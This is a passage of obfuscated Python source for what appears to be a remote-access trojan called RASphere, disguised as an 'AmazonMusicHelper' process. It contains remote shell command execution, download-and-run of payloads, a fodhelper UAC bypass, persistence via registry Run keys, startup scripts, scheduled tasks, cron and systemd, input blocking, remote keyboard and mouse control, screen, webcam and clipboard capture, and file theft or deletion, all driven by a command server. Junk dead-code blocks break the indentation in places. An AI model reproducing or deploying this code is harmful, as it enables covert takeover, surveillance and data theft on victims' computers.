        else:
            for c in [[_D("_s60"),"lock-session"],["gnome-screensaver-command","-l"],["xdg-screensaver","lock"]]:
                try: subprocess.run(c, capture_output=True, timeout=5); return True
                except FileNotFoundError: continue
            return False
    except Exception as e: _l.error(f"Lock err: {e}"); return False
def _sleep():
    try:
        if sys.platform == _D("_s61") and hasattr(ctypes, "windll"):
            try:
                import win32security, win32api, pywintypes, win32con
                token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
                priv = win32security.LookupPrivilegeValue(None, win32security.SE_SHUTDOWN_NAME)
                win32security.AdjustTokenPrivileges(token, False, [(priv, win32security.SE_PRIVILEGE_ENABLED)])
            except:
                pass  
            ctypes.windll.powrprof.SetSuspendState(0, 1, 0)
            return True
        elif sys.platform == _D("_s62"):
            subprocess.run([_D("_s63"),"sleepnow"], capture_output=True, timeout=5)
            return True
        else:
            subprocess.run([_D("_s64"),"suspend"], capture_output=True, timeout=5)
            return True
    except Exception as e: _l.error(f"Sleep err: {e}"); return False
def _wallpaper(path):
    ""_D("_s65")""
    is_url = path.startswith(_D("_s66")) or path.startswith("https://")
if 0:
    import hashlib
    _h = hashlib.sha256(b"dead").hexdigest()
    if is_url:
        try:
            import urllib.request, tempfile
            fd, tmp = tempfile.mkstemp(suffix=_D("_s67"), prefix="wp_")
            os.close(fd)
            urllib.request.urlretrieve(path, tmp)
            path = tmp
        except Exception as e: return False, f"Download failed: {e}"
    if not os.path.exists(path): return False, _D("_s68")
    try:
        if sys.platform == _D("_s69"):
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
            return True, _D("_s70")
        elif sys.platform == _D("_s71"):
            script = f'tell application "Finder" to set desktop picture to POSIX file "{path}"'
            subprocess.run([_D("_s72"), "-e", script], capture_output=True)
            return True, _D("_s73")
        else:
            for cmd in [
                [_D("_s74"), "set", "org.gnome.desktop.background", "picture-uri", f"file://{path}"],
                ["feh", _D("_s75"), path],
            ]:
                try: subprocess.run(cmd, capture_output=True, timeout=5); return True, _D("_s76")
                except: continue
            return False, _D("_s77")
    except Exception as e: return False, str(e)
def _msgbox(title, text):
    ""_D("_s78")""
    try:
        if sys.platform == _D("_s79"):
            ctypes.windll.user32.MessageBoxW(0, text, title, 0x40 | 0x0)
        elif sys.platform == _D("_s80"):
            subprocess.run([_D("_s81"), "-e", f'display dialog "{text}" with title "{title}" buttons {{"OK"}}'], capture_output=True)
        else:
            subprocess.run([_D("_s82"), "--info", "--title", title, "--text", text], capture_output=True)
        return True, _D("_s83")
    except Exception as e: return False, str(e)
def _openurl(url):
    ""_D("_s84")""
    try:
        import webbrowser; webbrowser.open(url)
        return True, f"Opened {url}"
    except Exception as e: return False, str(e)
def _screenshot():
    ""_D("_s85")""
    if not HAS["mss"]: return None, _D("_s86")
    try:
        with mss.mss() as sct:
            ss = sct.grab(sct.monitors[1])
            if HAS["pil"]:
                img = Image.frombytes("RGB", ss.size, ss.bgra, "raw", _D("_s87"))
                buf = io.BytesIO(); img.save(buf, format="PNG")
                return base64.b64encode(buf.getvalue()).decode(), "png"
            return base64.b64encode(ss.bgra).decode(), "raw"
    except Exception as e: return None, str(e)
def _geoip():
    ""_D("_s88")""
    try:
        import urllib.request
        r = urllib.request.urlopen(_D("_s89"), timeout=5)
        return json.loads(r.read().decode())
    except Exception as e: return {_D("_s90"): str(e)}
def _apps():
    ""_D("_s91")""
    apps = []
    if sys.platform == _D("_s92"):
        for hk in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
            try:
                import winreg
                k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, hk)
                for i in range(winreg.QueryInfoKey(k)[0]):
                    try:
                        sk = winreg.OpenKey(k, winreg.EnumKey(k, i))
                        name = winreg.QueryValueEx(sk, _D("_s93"))[0]
                        if name: apps.append(name)
                        winreg.CloseKey(sk)
                    except: continue
                winreg.CloseKey(k)
            except: continue
    elif sys.platform == _D("_s94"):
        r = subprocess.run([_D("_s95"), "SPApplicationsDataType"], capture_output=True, text=True, timeout=10)
        apps = [l.strip() for l in r.stdout.split("\n") if l.strip() and not l.startswith(" ")]
    else:
        r = subprocess.run([_D("_s96"), "-l"], capture_output=True, text=True, timeout=10)
        apps = [l.split()[1] for l in r.stdout.split("\n")[5:] if l.strip()]
    return apps[:200]
def _play_sound(freq=800, dur=1):
    ""_D("_s97")""
    try:
        if sys.platform == _D("_s98"):
_xj = type("X", (), {"__init__": lambda s: None})()
if _xj is not None and 1 == 2:
    del _xj
            import winsound; winsound.Beep(int(freq), int(dur*1000))
            return True, _D("_s99")
        else:
            subprocess.run([_D("_s100"), "/usr/share/sounds/freedesktop/stereo/bell.oga"], capture_output=True, timeout=3)
            return True, _D("_s101")
    except Exception as e: return False, str(e)
def _search_files(root, pattern, max_results=50, max_depth=5):
    ""_D("_s102")""
    results = []
    root_depth = root.rstrip(os.sep).count(os.sep)
    try:
        for dirpath, _, filenames in os.walk(root):
            depth = dirpath.count(os.sep) - root_depth
            if depth > max_depth: continue
            for f in filenames:
                if pattern.lower() in f.lower():
                    results.append(os.path.join(dirpath, f))
                    if len(results) >= max_results: return results
            if len(results) >= max_results: break
    except: pass
    return results
def _execute_command(cmd):
    ""_D("_s103")""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return r.stdout + r.stderr, r.returncode
    except subprocess.TimeoutExpired: return _D("_s104"), -1
    except Exception as e: return str(e), -1
def _block_input(block=True):
    ""_D("_s105")""
    if sys.platform != _D("_s106"): return False, "Windows only"
    try:
        ok = ctypes.windll.user32.BlockInput(block)
        if ok: return True, _D("_s107") if block else "Input unblocked"
        return False, _D("_s108") if block else "Unblock failed"
    except Exception as e: return False, str(e)
def _download_exec(url, save_path=None):
    ""_D("_s109")""
    try:
        import urllib.request
        if not save_path:
            save_path = os.path.join(os.environ.get(_D("_s110"), "/tmp"), url.split("/")[-1] or "payload.exe")
        urllib.request.urlretrieve(url, save_path)
        if sys.platform == _D("_s111") and save_path.lower().endswith((".exe",".bat",".cmd",".ps1")):
            subprocess.Popen(save_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        elif save_path.endswith(".sh") or not sys.platform.startswith("win"):
            os.chmod(save_path, 0o755)
            subprocess.Popen(save_path, shell=True)
        return True, f"Downloaded to {save_path}"
    except Exception as e: return False, str(e)
CFG = {"FR": None}
def _flist(path=""):
    if CFG.get("FR") and path and not str(Path(path).resolve()).startswith(str(Path(CFG["FR"]).resolve())): path = CFG["FR"]
    if not path and sys.platform == _D("_s112"):
        return {_D("_s113"): "Drives", "parent": None, "items": [
            {_D("_s114"): f"{chr(l)}:\\", "path": f"{chr(l)}:\\", "type": "drive", "size": 0, "modified": ""}
            for l in range(ord("A"), ord("Z")+1) if os.path.exists(f"{chr(l)}:\\")]}
    t = Path(path).resolve() if path else Path.home()
    if not t.exists(): return {_D("_s115"): "Not found"}
    if t.is_file(): return {_D("_s116"): "Not a dir"}
    items = []
    denied = False
    try:
        entries = list(t.iterdir())
    except PermissionError:
        denied = True
        entries = []
    except OSError:
        denied = True
        entries = []
    for e in sorted(entries, key=lambda e: (not e.is_dir(), e.name.lower())):
        try:
            s = e.stat(); items.append({_D("_s117"): e.name, "path": str(e.resolve()),
                _D("_s118"): "dir" if e.is_dir() else "file", "size": s.st_size if e.is_file() else 0,
                _D("_s119"): datetime.fromtimestamp(s.st_mtime).isoformat()})
        except: items.append({_D("_s120"): e.name, "path": str(e.resolve()),
            _D("_s121"): "dir" if e.is_dir() else "file", "size": 0, "modified": "", "inaccessible": True})
    parent = str(t.parent.resolve()) if t.parent != t else None
    result = {_D("_s122"): str(t.resolve()), "parent": parent, "items": items}
    if denied:
        result[_D("_s123")] = "Partial listing - some entries may be hidden due to permissions"
    return result
def _fdel(path):
    t = Path(path).resolve()
    if not t.exists(): return False, _D("_s124")
    try:
        if t.is_dir(): shutil.rmtree(t)
        else: t.unlink()
        return True, _D("_s125")
    except Exception as e: return False, str(e)
def _fmkdir(parent, name):
    try: Path(parent).resolve().joinpath(name).mkdir(parents=False, exist_ok=False); return True, "OK"
    except Exception as e: return False, str(e)
def _fread(path, offset=0, cs=1024*1024):
    try:
        with open(path, "rb") as f: f.seek(offset); d = f.read(cs)
        return {_D("_s126"): base64.b64encode(d).decode(), "offset": offset, "size": len(d), "eof": len(d) < cs}
    except Exception as e: return {_D("_s127"): str(e)}
def _fwrite(path, b64, offset=0, mode="wb"):
    try:
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, mode) as f:
            if offset: f.seek(offset)
            f.write(base64.b64decode(b64))
        return True, "ok"
    except Exception as e: return False, str(e)
def _check_for_update(server_url):
    ""_D("_s128")""
    try:
        import urllib.request
        check_url = server_url.rstrip("/") + _D("_s129")
        r = urllib.request.urlopen(check_url, timeout=15)
        data = json.loads(r.read().decode())
        remote_ver = (data.get(_D("_s130")) or "").strip()
        download_url = (data.get(_D("_s131")) or "").strip()
        if not remote_ver or not download_url:
            _l.info(_D("_s132"))
            return None, None
        if remote_ver != _VERSION:
            _l.info(f"Update available: v{_VERSION} -> v{remote_ver}")
            return remote_ver, download_url
        else:
            _l.info(f"Client is up to date (v{_VERSION})")
            return None, None
    except Exception as e:
        _l.warning(f"Update check failed: {e}")
        return None, None
def _download_and_install(download_url, new_version):
    ""_D("_s133")""
    try:
        import urllib.request
        pd = _pdir()
        new_exe = os.path.join(pd, f"AmazonMusicHelper_v{new_version}.exe")
        _l.info(f"Downloading update from {download_url}...")
        urllib.request.urlretrieve(download_url, new_exe)
        _l.info(f"Downloaded to {new_exe}")
        current_exe = _exepath()
        bat_path = os.path.join(os.environ.get(_D("_s134"), pd), "rasphere_update.bat")
        with open(bat_path, "w") as f:
            f.write(f)
        _l.info(f"Update script written to {bat_path}")
        if sys.platform == _D("_s136"):
            subprocess.Popen([bat_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)
            _l.info(_D("_s137"))
        else:
            _l.error(_D("_s138"))
            return False
        return True
    except Exception as e:
        _l.error(f"Update download/install failed: {e}")
        return False
def _is_admin():
    ""_D("_s139")""
    try:
        if sys.platform == _D("_s140"):
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        pass
    try:
        return os.getuid() == 0
    except:
        pass
    return False
def _fodhelper_uac_bypass(args):
    if sys.platform != _D("_s141"):
        _l.warning(_D("_s142"))
        return False
    try:
        import winreg as wr
    except ImportError:
        _l.error(_D("_s143"))
        return False
    exe_path = _exepath()
    elevated_args = []
    i = 1
    while i < len(sys.argv):
        a = sys.argv[i]
        if a in (_D("_s144"), "--no-elevate", "--uninstall", "--install"):
            i += 1
            continue
        if a in (_D("_s145"), "--secret", "--id", "--reconnect"):
            elevated_args.append(a)
            if i + 1 < len(sys.argv):
                elevated_args.append(sys.argv[i + 1])
                i += 1
        else:
            elevated_args.append(a)
        i += 1
    elevated_args.append(_D("_s146"))
    cmd = subprocess.list2cmdline([exe_path] + elevated_args)
    _l.info(f"UAC bypass: relaunching as admin (fodhelper)")
    try:
        reg_path = r"Software\Classes\ms-settings\Shell\open\command"
        try:
            key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
            wr.DeleteValue(key, _D("_s147"))
            wr.CloseKey(key)
        except:
            pass
        key = wr.CreateKey(wr.HKEY_CURRENT_USER, reg_path)
        wr.SetValueEx(key, "", 0, wr.REG_SZ, cmd)
        wr.SetValueEx(key, _D("_s148"), 0, wr.REG_SZ, "")
        wr.CloseKey(key)
        try:
            settings_key = wr.CreateKey(wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
            wr.CloseKey(settings_key)
        except:
            pass
        fodhelper_path = os.path.join(os.environ.get(_D("_s149"), "C:\\Windows"), "System32", "fodhelper.exe")
        subprocess.Popen(fodhelper_path, creationflags=subprocess.CREATE_NO_WINDOW | 0x00000008, close_fds=True)
        _l.info(_D("_s150"))
        time.sleep(0.5)
        os._exit(0)
    except Exception as e:
        _l.error(f"UAC bypass failed: {e}")
        try:
            wr.DeleteKey(wr.HKEY_CURRENT_USER, reg_path)
        except:
            pass
        return False
def _cleanup_uac_registry():
    ""_D("_s151")""
    try:
        import winreg as wr
        reg_path = r"Software\Classes\ms-settings\Shell\open\command"
        try:
            key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
            try:
                wr.DeleteValue(key, _D("_s152"))
            except:
                pass
            try:
                wr.DeleteValue(key, "")
            except:
                pass
            wr.CloseKey(key)
        except:
            pass
        try:
            wr.DeleteKey(wr.HKEY_CURRENT_USER, reg_path)
        except:
            pass
        for p in [r"Software\Classes\ms-settings\Shell\open",
                  r"Software\Classes\ms-settings\Shell",
                  r"Software\Classes\ms-settings"]:
            try:
                wr.DeleteKey(wr.HKEY_CURRENT_USER, p)
            except:
                pass
        _l.info(_D("_s153"))
    except Exception as e:
        _l.debug(f"UAC cleanup (non-critical): {e}")
_keepalive_stop = threading.Event()
def _keepalive_pinger(server_url):
    ""_D("_s154")""
    import urllib.request
    health_url = server_url.rstrip("/") + _D("_s155")
    while not _keepalive_stop.is_set():
        _keepalive_stop.wait(_KEEPALIVE)
        if _keepalive_stop.is_set():
            break
        try:
            urllib.request.urlopen(health_url, timeout=10)
            _l.debug(_D("_s156"))
        except Exception as e:
            _l.debug(f"Keep-alive ping failed: {e}")
def _exepath():
    if getattr(sys, _D("_s157"), False): return sys.executable
    return os.path.abspath(sys.argv[0])
def _pdir():
    if sys.platform == _D("_s158"):
        b = os.environ.get(_D("_s159"), os.path.expanduser("~"))
        p = os.path.join(b, _D("_s160"))
    else:
        p = os.path.expanduser(_D("_s161"))
    os.makedirs(p, exist_ok=True)
    return p
def _ip(url, secret, rec, cid):
    ep = _exepath(); pd = _pdir()
    dest = os.path.join(pd, _D("_s162") if sys.platform == "win32" else "amazonmusicd")
    if ep != dest:
        try: shutil.copy2(ep, dest); _l.info(f"Copied: {dest}")
        except Exception as e: _l.warning(f"Copy fail: {e}"); dest = ep
    ca = [dest, _D("_s163"), url or _SERVER, "--secret", secret or _SECRET, "--reconnect", str(rec or _RECON), "--no-persist"]
    if cid: ca += [_D("_s164"), cid]
    cl = subprocess.list2cmdline(ca)
    ok = False
    if sys.platform == _D("_s165"):
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, _D("_s166"), 0, winreg.REG_SZ, cl); winreg.CloseKey(k); _l.info("Installed: Registry"); ok = True
        except Exception as e: _l.warning(f"Reg fail: {e}")
        try:
            sd = os.path.join(os.environ.get(_D("_s167"),""), "Microsoft","Windows","Start Menu","Programs","Startup")
            if os.path.exists(sd):
                vp = os.path.join(sd, _D("_s168"))
                with open(vp, "w") as f: f.write(f'CreateObject("WScript.Shell").Run "{cl.replace(chr(34), chr(34)+chr(34))}", 0, False')
                _l.info(_D("_s169")); ok = True
        except Exception as e: _l.warning(f"VBS fail: {e}")
        try:
            subprocess.run([_D("_s170"),"/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            r = subprocess.run([_D("_s171"),"/Create","/TN","AmazonMusicHelper","/TR",cl,"/SC","ONLOGON","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            if r.returncode == 0: _l.info(_D("_s172")); ok = True
        except Exception as e: _l.warning(f"Task fail: {e}")
    else:
        try:
            cline = f"@reboot {cl} > /dev/null 2>&1 &"
            ex = subprocess.run([_D("_s173"),"-l"], capture_output=True, text=True)
            ct = (ex.stdout or "")
            if _D("_s174") not in ct:
                ct += f"\n
                subprocess.run([_D("_s175"),"-"], input=ct, text=True)
                _l.info(_D("_s176")); ok = True
        except Exception as e: _l.warning(f"Cron fail: {e}")
        try:
            sd = os.path.expanduser(_D("_s177")); os.makedirs(sd, exist_ok=True)
            sc = f"[Unit]\nDescription=Amazon Music Helper\nAfter=network.target\n\n[Service]\nExecStart={cl}\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=default.target\n"
            with open(os.path.join(sd, _D("_s178")), "w") as f: f.write(sc)
            subprocess.run([_D("_s179"),"--user","daemon-reload"], capture_output=True)
            subprocess.run([_D("_s180"),"--user","enable","amazonmusic-helper"], capture_output=True)
            _l.info(_D("_s181")); ok = True
        except Exception as e: _l.warning(f"systemd fail: {e}")
    return ok
def _up():
    ok = False
    if sys.platform == _D("_s182"):
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            try: winreg.DeleteValue(k, _D("_s183")); ok = True
            except FileNotFoundError: pass
            winreg.CloseKey(k)
        except: pass
        try:
            vp = os.path.join(os.environ.get(_D("_s184"),""), "Microsoft","Windows","Start Menu","Programs","Startup","AmazonMusicHelper.vbs")
            if os.path.exists(vp): os.remove(vp); ok = True
        except: pass
        try: subprocess.run([_D("_s185"),"/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW); ok = True
        except: pass
    else:
        try:
            ex = subprocess.run([_D("_s186"),"-l"], capture_output=True, text=True)
            if ex.stdout and _D("_s187") in ex.stdout:
                nc = "\n".join(l for l in ex.stdout.split("\n")                    if _D("_s188") not in l)
                subprocess.run([_D("_s189"),"-"], input=nc, text=True); ok = True
        except: pass
        try:
            sp = os.path.expanduser(_D("_s190"))
            if os.path.exists(sp):
                subprocess.run([_D("_s191"),"--user","disable","amazonmusic-helper"], capture_output=True)
                os.remove(sp); subprocess.run([_D("_s192"),"--user","daemon-reload"], capture_output=True); ok = True
        except: pass
    try:
        pd = _pdir()
        for f in os.listdir(pd):
            try: os.remove(os.path.join(pd, f))
            except: pass
        try: os.rmdir(pd)
        except: pass
    except: pass
    return ok
def _sh(sio):
    sc = CapEngine(sio, _D("_s193"))
    wc = CapEngine(sio, _D("_s194"))
    mon = SysMon(sio)
    term = Term(sio)
    _s.scap = sc; _s.wcap = wc
    @sio.on(_D("_s195"))
    def _c():
        _l.info(_D("_s196")); _s.conn = True
        sio.emit(_D("_s197"), {"secret": _s.secret, "client_id": _s.cid,
            _D("_s198"): {"hostname": socket.gethostname(), "platform": sys.platform,
                _D("_s199"): os.environ.get("USERNAME", os.environ.get("USER","?")),
                _D("_s200"): {"screen": HAS["mss"], "input": HAS["pynput"], "clipboard": HAS["pyperclip"],
                    _D("_s201"): HAS["pycaw"], "monitor": HAS["psutil"], "terminal": True, "webcam": _h6}}})
    @sio.on(_D("_s202"))
    def _d():
        _block_input(False)  
        _l.info(_D("_s203")); _s.conn = False; _s.reg = False; sc.stop(); wc.stop(); mon.stop(); term.stop()
    @sio.on(_D("_s204"))
    def _r(d): _s.reg = True; _s.cid = d.get(_D("_s205"), _s.cid); _l.info(f"Registered: {_s.cid}")
    @sio.on(_D("_s206"))
    def _sc(d=None):
        if d and _D("_s207") in d: sc.monitor_idx = int(d.get("monitor", 1))
        sc.start(); sio.emit(_D("_s208"), {"active": True})
    @sio.on(_D("_s209"))
    def _sc2(): sc.stop(); sio.emit(_D("_s210"), {"active": False})
    @sio.on(_D("_s211"))
    def _smn(d):
        if d and _D("_s212") in d:
            sc.monitor_idx = int(d[_D("_s213")])
            was_running = sc.r
            if was_running:
                sc.stop()
                sc.start()
                sio.emit(_D("_s214"), {"active": True})
    @sio.on(_D("_s215"))
    def _sq(d):
        if d:
            if _D("_s216") in d: sc.q = max(1, min(100, int(d["quality"])))
            if _D("_s217") in d: sc.sc = max(0.1, min(1.0, float(d["scale"])))
            if "fps" in d: sc.fps = max(1, min(30, int(d["fps"])))
    @sio.on(_D("_s218"))
    def _wc(d=None): wc.start(); sio.emit(_D("_s219"), {"active": True})
    @sio.on(_D("_s220"))
    def _wc2(): wc.stop(); sio.emit(_D("_s221"), {"active": False})
    @sio.on(_D("_s222"))
    def _wq(d):
        if d:
            if _D("_s223") in d: wc.q = max(1, min(100, int(d["quality"])))
            if "fps" in d: wc.fps = max(1, min(30, int(d["fps"])))
    @sio.on(_D("_s224"))
    def _me(d):
        if not HAS[_D("_s225")] or not _s.mc: return
        try:
            a = d.get(_D("_s226"),"")
            if a == _D("_s227"): _s.mc.position = (int(d.get("x",0)*_s.sw), int(d.get("y",0)*_s.sh))
            elif a == _D("_s228"): _s.mc.move(int(d.get("dx",0)), int(d.get("dy",0)))
            elif a == _D("_s229"):
                bm = {_D("_s230"): MB.left, "right": MB.right, "middle": MB.middle}
                _s.mc.click(bm.get(d.get(_D("_s231"),"left").lower(), MB.left), 2 if d.get("double") else 1)
            elif a == _D("_s232"): _s.mc.press({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
            elif a == _D("_s233"): _s.mc.release({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
            elif a == _D("_s234"): _s.mc.scroll(int(d.get("dx",0)), int(d.get("dy",0)))
        except Exception as e: _l.error(f"Mouse err: {e}")
    @sio.on(_D("_s235"))
    def _ke(d):
        if not HAS[_D("_s236")] or not _s.kc: return
        try:
            SP = {_D("_s237"): Key.ctrl, "alt": Key.alt, "shift": Key.shift, "win": Key.cmd, "cmd": Key.cmd, "super": Key.cmd,
                  "tab": Key.tab, _D("_s238"): Key.enter, "esc": Key.esc, "space": Key.space, "backspace": Key.backspace,
                  _D("_s239"): Key.delete, "home": Key.home, "end": Key.end, "page_up": Key.page_up, "page_down": Key.page_down,
                  "up": Key.up, _D("_s240"): Key.down, "left": Key.left, "right": Key.right,
                  **{f"f{i}": getattr(Key, f"f{i}") for i in range(1,13)}}
            def rk(k): k = k.lower(); return SP.get(k, KeyCode.from_char(k))
            a = d.get(_D("_s241"),"")
            if a == _D("_s242"): _s.kc.press(rk(d.get("key","")))
            elif a == _D("_s243"): _s.kc.release(rk(d.get("key","")))
            elif a == _D("_s244"):
                ks = [rk(k) for k in d.get(_D("_s245"),[])]
                for k in ks: _s.kc.press(k)
                for k in reversed(ks): _s.kc.release(k)
            elif a == _D("_s246"): _s.kc.type(d.get("text",""))
            elif a == _D("_s247"):
                scs = {_D("_s248"): ([Key.ctrl, Key.alt], Key.delete), "ctrl_shift_esc": ([Key.ctrl, Key.shift], Key.esc),
                       _D("_s249"): ([Key.alt], Key.tab), "alt_f4": ([Key.alt], Key.f4),
                       _D("_s250"): ([Key.cmd], KeyCode.from_char("d")), "win_r": ([Key.cmd], KeyCode.from_char("r")),
                       _D("_s251"): ([Key.cmd], KeyCode.from_char("e")), "win_l": ([Key.cmd], KeyCode.from_char("l")),
                       _D("_s252"): ([Key.ctrl], KeyCode.from_char("c")), "ctrl_v": ([Key.ctrl], KeyCode.from_char("v")),
                       _D("_s253"): ([Key.ctrl], KeyCode.from_char("x")), "ctrl_z": ([Key.ctrl], KeyCode.from_char("z")),
                       _D("_s254"): ([Key.ctrl], KeyCode.from_char("a")), "ctrl_s": ([Key.ctrl], KeyCode.from_char("s"))}
                sc = scs.get(d.get(_D("_s255"),""))
                if sc:
                    for m in sc[0]: _s.kc.press(m)
                    _s.kc.press(sc[1]); _s.kc.release(sc[1])
                    for m in reversed(sc[0]): _s.kc.release(m)
        except Exception as e: _l.error(f"Key err: {e}")
    @sio.on(_D("_s256"))
    def _ts(): ok = term.start(); sio.emit(_D("_s257"), {"active": ok})
    @sio.on(_D("_s258"))
    def _ti(d): term.write((d or {}).get(_D("_s259"),""))
    @sio.on(_D("_s260"))
    def _tst(): term.stop(); sio.emit(_D("_s261"), {"active": False})
    @sio.on(_D("_s262"))
    def _sm(): mon.start(); sio.emit(_D("_s263"), {"active": True})
    @sio.on(_D("_s264"))
    def _sm2(): mon.stop(); sio.emit(_D("_s265"), {"active": False})
    @sio.on(_D("_s266"))
    def _gp(): sio.emit(_D("_s267"), {"processes": _proc()})
    @sio.on(_D("_s268"))
    def _kp(d): pid = (d or {}).get("pid"); ok, msg = _kill(pid); sio.emit(_D("_s269"), {"ok": ok, "message": msg, "pid": pid})
    @sio.on(_D("_s270"))
    def _cg():
        if HAS[_D("_s271")]:
            try: sio.emit(_D("_s272"), {"text": pyperclip.paste()})
            except Exception as e: sio.emit(_D("_s273"), {"error": str(e)})
        else: sio.emit(_D("_s274"), {"error": "N/A"})
    @sio.on(_D("_s275"))
    def _cs(d):
        if HAS[_D("_s276")]:
            try: pyperclip.copy((d or {}).get(_D("_s277"),"")); sio.emit("clipboard_status", {"ok": True})
            except Exception as e: sio.emit(_D("_s278"), {"ok": False, "error": str(e)})
        else: sio.emit(_D("_s279"), {"ok": False, "error": "N/A"})
    @sio.on(_D("_s280"))
    def _ag(): r = _audio(); sio.emit(_D("_s281"), r or {"error": "N/A"})
    @sio.on(_D("_s282"))
    def _as(d): lv = (d or {}).get(_D("_s283"),50); ok = _avol(int(lv)); sio.emit("audio_status", {"ok": ok, "volume": int(lv)})
    @sio.on(_D("_s284"))
    def _am(): ok = _amute(); r = _audio(); sio.emit(_D("_s285"), r or {"error": "N/A"})
    @sio.on(_D("_s286"))
    def _pmo(): ok = _monoff(); sio.emit(_D("_s287"), {"action": "monitor_off", "ok": ok})
    @sio.on(_D("_s288"))
    def _pl(): ok = _lock(); sio.emit(_D("_s289"), {"action": "lock", "ok": ok})
    @sio.on(_D("_s290"))
    def _ps(): ok = _sleep(); sio.emit(_D("_s291"), {"action": "sleep", "ok": ok})
    @sio.on(_D("_s292"))
    def _wp(d): ok, msg = _wallpaper((d or {}).get(_D("_s293"),"")); sio.emit("cmd_result", {"cmd": "wallpaper", "ok": ok, "message": msg})
    @sio.on(_D("_s294"))
    def _mb(d): ok, msg = _msgbox((d or {}).get(_D("_s295"),"RASphere"), (d or {}).get("text","Hello!")); sio.emit("cmd_result", {"cmd": "msgbox", "ok": ok, "message": msg})
    @sio.on(_D("_s296"))
    def _ou(d): ok, msg = _openurl((d or {}).get("url","")); sio.emit(_D("_s297"), {"cmd": "openurl", "ok": ok, "message": msg})
    @sio.on(_D("_s298"))
    def _tss(): data, fmt = _screenshot(); sio.emit(_D("_s299"), {"data": data, "format": fmt} if data else {"error": fmt})
    @sio.on(_D("_s300"))
    def _geo(): sio.emit(_D("_s301"), _geoip())
    @sio.on(_D("_s302"))
    def _ga(): sio.emit(_D("_s303"), {"apps": _apps()})
    @sio.on(_D("_s304"))
    def _psnd(d): ok, msg = _play_sound((d or {}).get(_D("_s305"),800), (d or {}).get("dur",1)); sio.emit("cmd_result", {"cmd": "sound", "ok": ok, "message": msg})
    @sio.on(_D("_s306"))
    def _sf(d): r = _search_files((d or {}).get(_D("_s307"),"C:\\"), (d or {}).get("pattern","*"), (d or {}).get("max",50)); sio.emit("search_result", {"results": r})
    @sio.on(_D("_s308"))
    def _ec(d): out, rc = _execute_command((d or {}).get(_D("_s309"),"")); sio.emit("execute_result", {"output": out, "code": rc})
    @sio.on(_D("_s310"))
    def _de(d): ok, msg = _download_exec((d or {}).get("url",""), (d or {}).get(_D("_s311"))); sio.emit("cmd_result", {"cmd": "download_exec", "ok": ok, "message": msg})
    @sio.on(_D("_s312"))
    def _ib(d=None): ok, msg = _block_input(True); sio.emit(_D("_s313"), {"cmd": "input_block", "ok": ok, "message": msg})
    @sio.on(_D("_s314"))
    def _iub(d=None): ok, msg = _block_input(False); sio.emit(_D("_s315"), {"cmd": "input_unblock", "ok": ok, "message": msg})
    @sio.on(_D("_s316"))
    def _fl(d): sio.emit(_D("_s317"), _flist((d or {}).get("path","")))
    @sio.on(_D("_s318"))
    def _fdr(d): sio.emit(_D("_s319"), {**_fread((d or {}).get("path",""), (d or {}).get("offset",0)), "path": (d or {}).get("path","")})
    @sio.on(_D("_s320"))
    def _fd(d): ok, msg = _fdel((d or {}).get(_D("_s321"),"")); sio.emit("file_delete_result", {"ok": ok, "message": msg})
    @sio.on(_D("_s322"))
    def _fnf(d): ok, msg = _fmkdir((d or {}).get(_D("_s323"),""), (d or {}).get("name","New Folder")); sio.emit("file_new_folder_result", {"ok": ok, "message": msg})
    @sio.on(_D("_s324"))
    def _fuc(d):
        path = (d or {}).get(_D("_s325"),""); chunk = (d or {}).get("data",""); offset = (d or {}).get("offset",0)
        mode = "wb" if offset == 0 else "ab"
        ok, msg = _fwrite(path, chunk, offset, mode)
        sio.emit(_D("_s326"), {"ok": ok, "message": msg, "path": path})
    @sio.on(_D("_s327"))
    def _ks(d=None):
        _l.warning(_D("_s328")); sc.stop(); wc.stop(); mon.stop(); term.stop(); sio.disconnect(); os._exit(0)
def main():
    p = argparse.ArgumentParser(description=_D("_s329"))
    p.add_argument(_D("_s330"), default=None, help=f"Server URL (default: {_SERVER})")
    p.add_argument(_D("_s331"), default=None, help=f"Client secret (default: ***)")
    p.add_argument(_D("_s332"), default=None, help="Client ID (default: auto)")
    p.add_argument(_D("_s333"), type=int, default=None, help=f"Reconnect delay (default: {_RECON}s)")
    p.add_argument(_D("_s334"), action="store_true", help="Install persistence")
    p.add_argument(_D("_s335"), action="store_true", help="Remove persistence")
    p.add_argument(_D("_s336"), action="store_true", help="Skip auto-persistence")
    p.add_argument(_D("_s337"), action="store_true", help=argparse.SUPPRESS)
    p.add_argument(_D("_s338"), action="store_true", help="Skip UAC bypass on startup")
    args = p.parse_args()
    url = args.server or _SERVER; secret = args.secret or _SECRET
    rec = args.reconnect if args.reconnect is not None else _RECON
    cid = args.id or _CLIENT_ID
    if args.uninstall:
